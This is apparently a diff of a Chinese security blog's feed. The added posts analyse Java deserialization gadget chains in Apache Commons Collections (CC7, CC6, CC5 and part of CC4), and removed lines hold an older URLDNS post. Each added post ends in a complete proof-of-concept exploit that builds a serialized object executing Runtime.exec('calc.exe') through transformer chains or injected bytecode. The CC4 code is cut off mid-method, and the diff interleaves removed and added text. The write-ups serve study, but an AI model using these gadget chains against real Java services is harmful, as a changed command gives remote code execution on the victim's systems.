-<p>此处的handler是URLStreamHandler类，其中的hashCode()代码如下</p>
-<pre><code class="language-java">    protected int hashCode(URL u) {
-        int h = 0;
+<p>追入<code>reconstitutionPut()</code>中，在里面找到<code>e.key.equals(key)</code>可以直接和<code>LazyMap</code>的<code>equals</code>方法进行对接。</p>
+<pre><code class="language-java">    private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)
+        throws StreamCorruptedException
+    {
+        if (value == null) {
+            throw new java.io.StreamCorruptedException();
+        }
+        // Makes sure the key is not already in the hashtable.
+        // This should not happen in deserialized version.
+        int hash = key.hashCode();
+        int index = (hash &amp; 0x7FFFFFFF) % tab.length;
+        for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) {
+            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) {
+                throw new java.io.StreamCorruptedException();
+            }
+        }
+        // Creates the new entry.
+        @SuppressWarnings(&quot;unchecked&quot;)
+            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];
+        tab[index] = new Entry&lt;&gt;(hash, key, value, e);
+        count++;
+    }
+</code></pre>
+<p><code>reconstitutionPut()</code> 会将 <code>HashTable</code> 里的键名<code>(key)</code>互相比较，而传入的key是<code>LazyMap</code>，相当于调用<code>LazyMap#equals()</code>。<br>
+但是<code>LazyMap</code>并没有直接实现<code>equals</code>方法，而是在其父类<code>AbstractMapDecorator</code>中实现的，也就是调用了<code>AbstractMapDecorator#equals()</code></p>
+<pre><code class="language-java">    public boolean equals(Object object) {
+        if (object == this) {
+            return true;
+        }
+        return map.equals(object);
+    }
+</code></pre>
+<p>可以看到该方法返回<code>map.equals(object)</code>的值，而<code>map</code>是在LazyMap的构造函数中被赋值：</p>
+<pre><code class="language-java">    protected LazyMap(Map map, Factory factory) {
+        super(map);
+        if (factory == null) {
+            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);
+        }
+        this.factory = FactoryTransformer.getInstance(factory);
+    }
+</code></pre>
+<p>如果传入<code>HashMap</code>，那么<code>map.equals(object)</code>实际上就是调用<code>HashMap的equals</code>方法。</p>
+<p>回到HashMap，其继承了<code>Abstract类</code>，而且二者都实现了Map接口。借用安全客的文章中的继承关系图片<br>
+<img src="https://limpid94.github.io/post-images/1649685077683.png" alt="" loading="lazy"><br>
+该链中需要跟一下equals方法，</p>
+<pre><code class="language-java">    public boolean equals(Object o) {
+        if (o == this)
+            return true;
 
-        // Generate the protocol part.
-        String protocol = u.getProtocol();
-        if (protocol != null)
-            h += protocol.hashCode();
+        if (!(o instanceof Map))
+            return false;
+        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;
+        if (m.size() != size())
+            return false;
 
-        // Generate the host part.
-        InetAddress addr = getHostAddress(u);
-        if (addr != null) {
-            h += addr.hashCode();
-        } else {
-            String host = u.getHost();
-            if (host != null)
-                h += host.toLowerCase().hashCode();
+        try {
+            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+            while (i.hasNext()) {
+                Entry&lt;K,V&gt; e = i.next();
+                K key = e.getKey();
+                V value = e.getValue();
+                if (value == null) {
+                    if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
+                        return false;
+                } else {
+                    if (!value.equals(m.get(key)))
+                        return false;
+                }
+            }
+        } catch (ClassCastException unused) {
+            return false;
+        } catch (NullPointerException unused) {
+            return false;
+        }
+
+        return true;
+    }
+</code></pre>
+<p>其中有两处<code>m.get(key)</code>的调用就是触发命令执行的链接点。</p>
+<h3 id="注意点">注意点</h3>
+<p>整条链条看上去并不复杂，但是值得注意的细节比较多。<br>
+首先是需要【两个HashMap】。因为在Hashtable的put方法中：</p>
+<pre><code class="language-java">    public synchronized V put(K key, V value) {
+       ......(部分代码省略)
+        for(; entry != null ; entry = entry.next) {
+            if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) {
+                V old = entry.value;
+                entry.value = value;
+                return old;
+            }
         }
         ......
 </code></pre>
-<p>这里调用<code>getHostAddress</code>方法又会将传入的url交给<code>InetAddress.getByName()</code>方法：</p>
-<pre><code class="language-java">    protected synchronized InetAddress getHostAddress(URL u) {
-        if (u.hostAddress != null)
-            return u.hostAddress;
-
-        String host = u.getHost();
-        if (host == null || host.equals(&quot;&quot;)) {
-            return null;
-        } else {
-            try {
-                u.hostAddress = InetAddress.getByName(host);
-            } catch (UnknownHostException ex) {
-                return null;
-            } catch (SecurityException se) {
-                return null;
+<p>两个hashmap相同的话会直接在hashtable put的时候认为是一个元素，之后在反序列化的时候不再触发反序列化代码。</p>
+<p>其次是【zZ和yy】。一开始以为是任意的两个字符串，但是经过分析之后发现实际上是有作用的。<br>
+仔细看一下<code>Hashtable#reconstitutionPut</code>的代码</p>
+<pre><code class="language-java">    private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)
+        throws StreamCorruptedException
+    {
+        if (value == null) {
+            throw new java.io.StreamCorruptedException();
+        }
+        // Makes sure the key is not already in the hashtable.
+        // This should not happen in deserialized version.
+        int hash = key.hashCode();
+        int index = (hash &amp; 0x7FFFFFFF) % tab.length;
+        for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) {
+            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) {
+                throw new java.io.StreamCorruptedException();
             }
         }
-        return u.hostAddress;
+        // Creates the new entry.
+        @SuppressWarnings(&quot;unchecked&quot;)
+            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];
+        tab[index] = new Entry&lt;&gt;(hash, key, value, e);
+        count++;
     }
 </code></pre>
-<p>该方法会返回所提供的域名对应的IP，因此在此处会产生一次域名查询。</p>
-<h3 id="urldns反序列化链的构建">URLDNS反序列化链的构建</h3>
-<p>由于URL中的handler是被transient修饰的URLStreamHandler类的对象，因此在序列化时不会写入序列化的结果中，并且在writeObject方法中没有其他的特色处理（如下两张图），因此直接序列化是行不通的<br>
-<img src="https://limpid94.github.io/post-images/1644329621179.PNG" alt="" loading="lazy"></p>
-<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1644329704713.PNG" alt="" loading="lazy"></figure>
-<p>于是需要查找其他的入口类中调用了hashCode方法的类。<br>
-在本文开头处提到，查找的时候最好找具有三个特点地类（重写readObject、参数类型宽泛和JDK自带）。于是HashMap类就比较符合。HashMap为了保证在不同版本中的hash值的唯一性，重新定义了自己的hashCode计算方法并且重写了readObject方法。</p>
-<p>在<code>HashMap的readObject</code>方法中循环从流中读取<code>key</code>和<code>value</code>的值并用<code>putVal</code>来放入map中，并且调用<code>hash()</code>来计算哈希值。<br>
-<img src="https://limpid94.github.io/post-images/1644332524763.PNG" alt="" loading="lazy"><br>
-追入hash()，看到具体源码：<br>
-<img src="https://limpid94.github.io/post-images/1644332622063.PNG" alt="" loading="lazy"><br>
-若传入的key为URL类，则key.hashCode()则调用了URL类的hashCode方法。<br>
-于是大致可以新建一个HashMap的示例并放入key为URL的示例，value为任意内容（此处为Integer）</p>
-<pre><code class="language-java">import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.ObjectOutputStream;
-import java.net.URL;
-import java.util.HashMap;
+<p>其中<code>if ((e.hash == hash) &amp;&amp; e.key.equals(key))</code>要求两个哈希必须相等。此处想到和2022虎符CTF的web题类似，需要从hashCode计算方法入手<br>
+<img src="https://limpid94.github.io/post-images/1649825895114.png" alt="" loading="lazy"><br>
+因此假定比较的第一个字符串为'yy'，其字符的ASCII是121，若第二个字符串开头与之相差1，即z开头，那么z后的字符应该是121-31=90,就是Z。因此要和第一个字符串相等，第二个字符串可以是zZ。（当然，不是只有这两个字符串，只要符合这个规律的字符串都行）<br>
+这里其实还隐含了一个条件，就是这两个字符串不能是相同的。因为lazymap#get()中有这样的逻辑：</p>
+<pre><code class="language-java">        if (map.containsKey(key) == false) {
+            Object value = factory.transform(key);
+            map.put(key, value);
+            return value;
+        }
+</code></pre>
+<p>请注意到containsKey()方法：<br>
+<img src="https://limpid94.github.io/post-images/1649826795369.png" alt="" loading="lazy"></p>
+<p>也就是相同的key会导致其不进入<code>transform()</code>方法。</p>
+<p>再者需要理解 【lazyMap2.remove(&quot;yy&quot;);】。因为<code>hashtable</code>有两次<code>put</code>的操作，在第二次<code>hashtable.put(lazyMap2, 1);</code>时，会触发LazyMap 的 get 方法，会新增一个 key/value 值相同的键值对，所以此时会多出一个yy。<br>
+<img src="https://limpid94.github.io/post-images/1649829997580.png" alt="" loading="lazy"></p>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonscollections;
 
-public class MyURLDNS {
-    public static void serialize(Object obj) throws IOException {
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class CommonCollections7 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})
+        };
+
+        Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
+        //LazyMap传入的值需要一个map类型，因此用HashMap
+        HashMap&lt;Object, Object&gt; innerMap1 = new HashMap&lt;&gt;();
+        HashMap&lt;Object, Object&gt; innerMap2 = new HashMap&lt;&gt;();
+        Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);
+        lazyMap1.put(&quot;yy&quot;,1);
+        Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
+        lazyMap2.put(&quot;zZ&quot;,1);
+
+
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1,1);
+        hashtable.put(lazyMap2,1);
+
+        Field iTransformersField = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
+        iTransformersField.setAccessible(true);
+        iTransformersField.set(chainedTransformer,transformers);
+        lazyMap2.remove(&quot;yy&quot;);
+
+//        mySeriable(hashtable);
+        myDeseriable();
+    }
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser7.bin&quot;));
         oos.writeObject(obj);
     }
 
-    public static void main(String[] args) throws IOException {
-        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
-        hashmap.put(new URL(&quot;http://13bf5a54.dns.1433.eu.org&quot;),123);
-        serialize(hashmap);
+    public static Object myDeseriable() throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser7.bin&quot;));
+        return ois.readObject();
+    }
+}
+</code></pre>
+<h2 id="参考资料">参考资料</h2>
+<p>https://www.anquanke.com/post/id/240040#h3-4<br>
+https://javamana.com/2022/03/202203132203154936.html<br>
+https://blog.csdn.net/qq_35733751/article/details/119862728<br>
+https://blog.weik1.top/2021/03/02/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90/#CommonCollections7<br>
+http://cnblogs.com/nice0e3/p/13910833.html<br>
+https://blog.csdn.net/weixin_44245828/article/details/109853439</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[【Java反序列化】CommonCollections6利用链]]></title>
+        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections6-li-yong-lian/</id>
+        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections6-li-yong-lian/">
+        </link>
+        <updated>2022-04-06T13:52:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="利用连">利用连</h2>
+<pre><code>	Gadget chain:
+	    java.io.ObjectInputStream.readObject()
+            java.util.HashSet.readObject()
+                java.util.HashMap.put()
+                java.util.HashMap.hash()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+                        org.apache.commons.collections.map.LazyMap.get()
+                            org.apache.commons.collections.functors.ChainedTransformer.transform()
+                            org.apache.commons.collections.functors.InvokerTransformer.transform()
+                            java.lang.reflect.Method.invoke()
+                                java.lang.Runtime.exec()
+</code></pre>
+<h2 id="差异点分析">差异点分析</h2>
+<p>CC6和CC5在后半段基本相同，前半部分的差异在于CC5中使用的是<code>BadAttributeValueExpException</code>而CC6用<code>HashSet</code>去调用<code>LazyMap#get()</code>。<br>
+此处还是要回顾一下<code>TiedMapEntry</code>中有两处调用了<code>getValue()</code>，分别是<code>toString()</code>和<code>hashCode()</code></p>
+<pre><code class="language-java">    /**
+     * Gets a hashCode compatible with the equals method.
+     * &lt;p&gt;
+     * Implemented per API documentation of {@link java.util.Map.Entry#hashCode()}
+     * 
+     * @return a suitable hash code
+     */
+    public int hashCode() {
+        Object value = getValue();
+        return (getKey() == null ? 0 : getKey().hashCode()) ^
+               (value == null ? 0 : value.hashCode()); 
+    }
+
+    /**
+     * Gets a string version of the entry.
+     * 
+     * @return entry as a string
+     */
+    public String toString() {
+        return getKey() + &quot;=&quot; + getValue();
+    }
+</code></pre>
+<p>CC5是调用<code>toString()</code>，而CC6则调用<code>hashCode()</code>。</p>
+<h3 id="hashset">HashSet</h3>
+<p>HashSet本质还是调用HashMap，这点从他的构造函数可以看出：</p>
+<pre><code class="language-java">    /**
+     * Constructs a new, empty set; the backing &lt;tt&gt;HashMap&lt;/tt&gt; instance has
+     * default initial capacity (16) and load factor (0.75).
+     */
+    public HashSet() {
+        map = new HashMap&lt;&gt;();
+    }
+</code></pre>
+<p>并且其<code>add()</code>实质上是调用<code>HashMap</code>的<code>put()</code>。</p>
+<pre><code class="language-java">    public boolean add(E e) {
+        return map.put(e, PRESENT)==null;
+    }
+</code></pre>
+<p>从URLDNS中对于HashMap的了解可以知道<code>put()</code>会调用<code>HashMap#hash()</code>来计算添加进来的新元素的哈希值，因而可以调用<code>TiedMap#hashCode()</code></p>
+<pre><code class="language-java">    static final int hash(Object key) {
+        int h;
+        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+    }
+</code></pre>
+<p>选用<code>HashSet</code>还有一个原因在于其重写了<code>readObject()</code>并且在该方法中直接调用了<code>put()</code>。</p>
+<pre><code class="language-java">    private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        // Read in any hidden serialization magic
+        s.defaultReadObject();
+
+        // Read capacity and verify non-negative.
+        int capacity = s.readInt();
+        if (capacity &lt; 0) {
+            throw new InvalidObjectException(&quot;Illegal capacity: &quot; +
+                                             capacity);
+        }
+
+        // Read load factor and verify positive and non NaN.
+        float loadFactor = s.readFloat();
+        if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) {
+            throw new InvalidObjectException(&quot;Illegal load factor: &quot; +
+                                             loadFactor);
+        }
+
+        // Read size and verify non-negative.
+        int size = s.readInt();
+        if (size &lt; 0) {
+            throw new InvalidObjectException(&quot;Illegal size: &quot; +
+                                             size);
+        }
+
+        // Set the capacity according to the size and load factor ensuring that
+        // the HashMap is at least 25% full but clamping to maximum capacity.
+        capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f),
+                HashMap.MAXIMUM_CAPACITY);
+
+        // Create backing HashMap
+        map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ?
+               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :
+               new HashMap&lt;E,Object&gt;(capacity, loadFactor));
+
+        // Read in all elements in the proper order.
+        for (int i=0; i&lt;size; i++) {
+            @SuppressWarnings(&quot;unchecked&quot;)
+                E e = (E) s.readObject();
+            map.put(e, PRESENT);
+        }
+    }
+</code></pre>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonscollections;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+
+public class CommonCollections6 {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})
+        };
+
+        Transformer chainedTransformer = new ChainedTransformer(transformers);
+        //LazyMap传入的值需要一个map类型，因此用HashMap
+        HashMap&lt;Object, Object&gt; innerMap = new HashMap&lt;&gt;();
+        Map outterMap = LazyMap.decorate(innerMap, new ConstantTransformer(1));
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(outterMap, &quot;aaa&quot;);
+        //HashMap版本写法
+//        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+//        map.put(tiedMapEntry,&quot;bbb&quot;);
+        //HashSet版本写法
+        HashSet hashSet = new HashSet();
+        hashSet.add(tiedMapEntry);
+        outterMap.remove(&quot;aaa&quot;);
+
+        Class c = LazyMap.class;
+        Field factory = c.getDeclaredField(&quot;factory&quot;);
+        factory.setAccessible(true);
+        factory.set(outterMap,chainedTransformer);
+//        mySeriable(hashSet);
+        myDeseriable();
+
+    }
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser6.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static Object myDeseriable() throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser6.bin&quot;));
+        return ois.readObject();
     }
 
 }
 </code></pre>
-<p>但是这样会有个问题，在反序列化过程中由于hashCode已经有值了，于是直接返回hashCode，不会再调用hash方法进行计算，因此无法触发DNS查询。<br>
-为了避免这个现象，需要使用反射的方式来修改hashCode的值<br>
-于是main函数部分变成：</p>
-<pre><code class="language-java">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
-        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
-        URL u = new URL(&quot;http://93284a7e.dns.1433.eu.org&quot;);
-        hashmap.put(u,123);
-
-        Field field = URL.class.getDeclaredField(&quot;hashCode&quot;);
-        field.setAccessible(true);
-        field.set(u,-1);
-
-        serialize(hashmap);
+<h2 id="参考资料">参考资料</h2>
+<p>https://www.anquanke.com/post/id/233410#h2-7<br>
+https://blog.csdn.net/qq_35733751/article/details/119077706<br>
+https://cdmana.com/2022/03/202203130641446748.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[【Java反序列化】CommonCollections5利用链]]></title>
+        <id>https://limpid94.github.io/post/a/</id>
+        <link href="https://limpid94.github.io/post/a/">
+        </link>
+        <updated>2022-04-06T06:55:49.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="调用链">调用链</h2>
+<pre><code>	Gadget chain:
+        ObjectInputStream.readObject()
+            BadAttributeValueExpException.readObject()
+                TiedMapEntry.toString()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
 </code></pre>
-<p>但是还是存在一个问题，序列化时就会产生DNS请求，干扰测试结果。<br>
-为了解决该问题，ysoserial中的解决办法就是自己写一个hander类，将<code>openConnection</code>和<code>getHostAddress</code>改写成返回null的操作。</p>
-<pre><code class="language-java">//自己实现的URLStreamHandler类
-    static class MyURLStreamHandler extends URLStreamHandler {
+<h2 id="差异点">差异点</h2>
+<p>CC5和CC1很相似，但是由于高版本的JDK对<code>AnnotationInvocationHandler</code>的<code>readObject</code>方法进行重写，因此将调用<code>LazyMap</code>的<code>get()</code>改成<code>TiedMapEntry</code>的<code>toString()</code>。为了方便调用<code>TiedMapEntry#toString()</code>，将入口点也换成<code>BadAttributeValueExpException</code>。</p>
+<h3 id="tiedmapentry">TiedMapEntry</h3>
+<p>在该类的<code>getValue()</code>中调用了<code>get()</code>，而且<code>map</code>和<code>key</code>都在初始化时进行赋值（即参数可控）。</p>
+<pre><code class="language-java">    public TiedMapEntry(Map map, Object key) {
+        super();
+        this.map = map;
+        this.key = key;
+    }
 
-        @Override
-        protected URLConnection openConnection(URL u) throws IOException {
+    public Object getValue() {
+        return map.get(key);
+    }
+</code></pre>
+<p>紧接着在该类的<code>toString()</code>中调用了<code>getValue()</code>。此时如果能找到一个类既重写<code>readObject()</code>又在该方法中直接调用了<code>toString()</code>就能构成一条完整的利用链。<br>
+经过查找找到<code>BadAttributeValueExpException</code>满足条件。<br>
+<img src="https://limpid94.github.io/post-images/1649239982286.png" alt="" loading="lazy"></p>
+<h2 id="badattributevalueexpexception">BadAttributeValueExpException</h2>
+<p>先看其<code>readObject()</code>，其内部直接调用<code>toString()</code></p>
+<pre><code class="language-java">    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+        ObjectInputStream.GetField gf = ois.readFields();
+        Object valObj = gf.get(&quot;val&quot;, null);
+
+        if (valObj == null) {
+            val = null;
+        } else if (valObj instanceof String) {
+            val= valObj;
+        } else if (System.getSecurityManager() == null
+                || valObj instanceof Long
+                || valObj instanceof Integer
+                || valObj instanceof Float
+                || valObj instanceof Double
+                || valObj instanceof Byte
+                || valObj instanceof Short
+                || valObj instanceof Boolean) {
+            val = valObj.toString();
+        } else { // the serialized object is from a version without JDK-8019292 fix
+            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
+        }
+    }
+</code></pre>
+<p>但是在构造的时候需要注意其构造函数：</p>
+<pre><code class="language-java">    public BadAttributeValueExpException (Object val) {
+        this.val = val == null ? null : val.toString();
+    }
+</code></pre>
+<p>在赋值时会先判断传入的是否为<code>null</code>，不是就直接调用<code>toString()</code>，直接触发利用链。因此在初始化时 需要先传入null，然后再用反射来修改<code>val</code>的值</p>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonscollections;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonCollections5 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[]{String.class},
+                        new Object[]{&quot;calc.exe&quot;}
+                )
+        };
+        Transformer chainedTransformer = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outterMap = LazyMap.decorate(innerMap,chainedTransformer);
+        //需要调用lazymap的get()
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(outterMap, &quot;bbb&quot;);
+        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
+        Field badField = bad.getClass().getDeclaredField(&quot;val&quot;);
+        badField.setAccessible(true);
+        badField.set(bad,tiedMapEntry);
+//        mySeriable(bad);
+        myDeseriable(&quot;ser5.bin&quot;);
+    }
+
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser5.bin&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+
+    public static Object myDeseriable(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(s));
+        return ois.readObject();
+    }
+}
+
+</code></pre>
+<h2 id="参考资料">参考资料</h2>
+<p>https://www.anquanke.com/post/id/233410#h3-5<br>
+https://blog.csdn.net/qq_35733751/article/details/119077706<br>
+https://blog.weik1.top/2021/03/02/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90/#CommonCollections5</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[【Java反序列化】CommonCollections4利用链]]></title>
+        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections4-li-yong-lian/</id>
+        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections4-li-yong-lian/">
+        </link>
+        <updated>2022-04-05T16:36:57.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="调用链">调用链</h2>
+<pre><code>Gadget chain:
+    ObjectInputStream.readObject()
+        PriorityQueue.readObject()
+        ...
+            ChainedTransformer.transform()
+                ConstantTransformer.transform()
+                    InstantiateTransformer.transform()
+                        TrAXFilter.TrAXFilter()
+                            ...
+                                exec()
+</code></pre>
+<p>CC4采用的命令执行部分同CC2、CC3，而触发部分还是和CC2的结构相类似。<br>
+CC4采用<code>ChainedTransformer+TransformingComparator</code>，而CC2采用<code>InvokerTransformer+TransformingComparator</code>，这算是细微的差别吧。</p>
+<p>【借用 https://www.anquanke.com/post/id/233393#h2-7 的图】<br>
+<img src="https://limpid94.github.io/post-images/1649227036444.png" alt="" loading="lazy"></p>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonscollections;
+
+import com.sun.corba.se.impl.orbutil.closure.Constant;
+import com.sun.net.httpserver.Filter;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.Transformer;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class CommonCollections4 {
+    public static void main(String[] args) throws Exception {
+        //获取默认类池
+        ClassPool pool = ClassPool.getDefault();
+        //添加路径
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        //创建新类
+        CtClass evil = pool.makeClass(&quot;Evil&quot;);
+        //设置类名
+        evil.setName(&quot;MyEvil&quot;);
+        //设置要继承的类
+        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        //创建空的构造函数
+        CtConstructor newconstructor = evil.makeClassInitializer();
+        //将字节码插入开头
+        newconstructor.insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;);
+        evil.writeFile();
+
+        byte[] bytecode = evil.toBytecode();
+        byte[][] bytecodes = {bytecode};
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+
+        Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+        //++++++++++++++++++++++++++++++++代码执行部分结束+++++++++++++++++++++++++++++++++++++
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(
+                        new Class[]{Templates.class},
+                        new Object[]{templates}
+                )
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        TransformingComparator comparator = new TransformingComparator(new ConstantTransformer(1));
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2,comparator);
+        queue.add(templates);
+        queue.add(&quot;hahaha&quot;);
+
+        Field cField = comparator.getClass().getDeclaredField(&quot;transformer&quot;);
+        cField.setAccessible(true);
+        cField.set(comparator ,chainedTransformer);
+//        mySeriable(queue);
+        myDeseriable(&quot;ser4.bin&quot;);
+    }
+
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser4.bin&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+
+    public static Object myDeseriable(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(s));
